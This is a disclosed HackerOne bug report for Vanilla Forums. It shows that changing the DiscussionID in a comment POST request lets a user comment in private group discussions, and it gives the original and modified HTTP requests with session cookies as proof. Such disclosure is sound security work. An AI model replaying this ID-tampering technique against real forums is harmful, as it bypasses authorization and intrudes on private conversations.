---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '321725'
original_report_id: '321725'
title: A user can comment in private discussions without having permission to access
  the discussion
weakness: Business Logic Errors
team_handle: vanilla
created_at: '2018-03-04T05:31:24.974Z'
disclosed_at: '2018-06-22T02:00:20.691Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: '*.vanillastaging.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# A user can comment in private discussions without having permission to access the discussion

## Metadata

- HackerOne Report ID: 321725
- Weakness: Business Logic Errors
- Program: vanilla
- Disclosed At: 2018-06-22T02:00:20.691Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello team,

 I have found a vulnerability which allows a user who does not have access to a discussion to comment on it and thus avoid the control applied. (http://littleguy.vanillastaging.com/)

Proof Of Concept
=============

For this proof of concept I have used 3 users. User A creates a PRIVATE group and invites user B to join it. Subsequently, user A creates a private discussion.

http://littleguy.vanillastaging.com/discussion/15/

This is the private discussion  between User A and User B, obviously you can't have access

{F269044}

Now user C tries to access this discussion however the following is observed

{F269045}

However, make a comment about any public discussion and you get the following request

Original Request
=============

```
POST /post/comment/?discussionid=5 HTTP/1.1
Host: littleguy.vanillastaging.com
Content-Length: 193
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://littleguy.vanillastaging.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
Cookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074
Connection: close

TransientKey=your_token_id&hpt=&DiscussionID=5&CommentID=&DraftID=&Format=Wysiwyg&Body=I'm+user+C%26nbsp%3B&_wysihtml5_mode=1&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Post&LastCommentID=17
```

Now the user modifies the DiscussionID variable that is in the URI and in the data of the POST by the ID of the private discussion (ID number 15)

Modified Request
==============

```
POST /post/comment/?discussionid=15 HTTP/1.1
Host: littleguy.vanillastaging.com
Content-Length: 194
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://littleguy.vanillastaging.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
Cookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074
Connection: close

TransientKey=your_token_id&hpt=&DiscussionID=15&CommentID=&DraftID=&Format=Wysiwyg&Body=I'm+user+C%26nbsp%3B&_wysihtml5_mode=1&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Post&LastCommentID=17
```

{F269046}

User C has managed to comment on the private discussion


Thanks

## Impact

It should be mentioned that here there is a problem at the ID level, all the discussions are generated with consecutive numeric IDs, this means that an attacker could list all the discussions (public and private) and comment on the private ones without authorization.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
